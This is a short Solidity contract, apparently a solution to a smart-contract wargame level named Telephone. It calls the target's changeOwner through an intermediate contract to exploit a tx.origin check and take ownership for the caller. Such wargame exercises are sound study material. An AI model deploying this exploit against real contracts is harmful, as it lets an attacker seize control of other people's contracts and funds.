// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Telephone } from "../../src/5/Telephone.sol";

contract TelephoneAttack {

    Telephone orgContract;

    constructor(address _telephoneAddress) {
        orgContract = Telephone(_telephoneAddress);
    }

    function attack() public {
        orgContract.changeOwner(msg.sender);
    }

}